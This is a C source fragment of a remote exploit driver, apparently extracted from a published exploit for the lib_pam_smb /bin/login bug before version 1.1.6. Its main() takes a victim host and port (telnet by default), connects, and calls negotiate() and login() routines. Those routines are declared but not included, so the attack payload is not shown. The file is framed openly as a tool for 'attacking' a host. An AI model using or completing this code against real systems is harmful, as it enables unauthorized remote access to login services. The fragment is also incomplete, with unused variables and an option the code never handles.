
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int sock ;


 int AF_INET ;
 int SOCK_STREAM ;
 short atoi (char*) ;
 int connect (int,struct sockaddr*,int) ;
 struct hostent* gethostbyname (char*) ;
 int getopt (int,char**,char*) ;
 int htons (short) ;
 int login (int) ;
 int memcpy (int *,int ,int ) ;
 int negotiate (int) ;
 char* optarg ;
 int printf (char*,...) ;
 int socket (int ,int ,int ) ;

int main(int argc,char **argv)
{
        struct sockaddr_in sock;
        struct hostent *pHe;
        int sd;
 short port = -1;
 int x;
 char *host = ((void*)0);
 char *user = ((void*)0);
 char exp[1024];
 int a;
 char *default_port = "23";

 printf("linux_pam_smb\n");
 printf("Linux lib_pam_smb < 1.1.6 /bin/login remote exploit\n");
 printf("[vertex//lids/org]\n\n");
 if (argc < 2)
 {
  printf("%s -h <victim> [-p port] \n",argv[0]);
  return 0;
 }
 while ((a = getopt(argc,argv,"h:p:u:")) != -1)
 {
  switch (a)
  {
   case 'h':
    host = optarg;
    break;

                        case 'p':
                                port = atoi(optarg);
                                break;

   default:
    printf("[-] invalid option.\n");
    break;
  }
 }
 if (host == ((void*)0))
 {
  printf("[-] must specify a host to attack\n");
  return 0;
        }
 if (port < 0)
  port = atoi(default_port);
 if ((pHe = gethostbyname(host)) == ((void*)0))
        {
                printf("Host lookup error.\n");
                return 0;
        }
 printf("[*] attacking %s:%d\n",host,port);
 printf("[*] opening socket\n");
        if ((sd = socket(AF_INET,SOCK_STREAM,0)) == -1)
        {
                printf("[-] could not create socket");
                return 0;
        }
 sock.sin_family = AF_INET;
 sock.sin_port = htons(port);
 memcpy(&sock.sin_addr.s_addr,pHe->h_addr,pHe->h_length);
 if ((connect(sd,(struct sockaddr *)&sock,sizeof(sock))) == -1)
        {
                printf("[-] failed to connect to %s\n",host);
                return 0;
        }
 printf("[*] connected!\n");
 printf("[*] Begin negotiate... \n");
 negotiate(sd);
 printf("[*] Login... \n");
 login(sd);
 return 0;
}
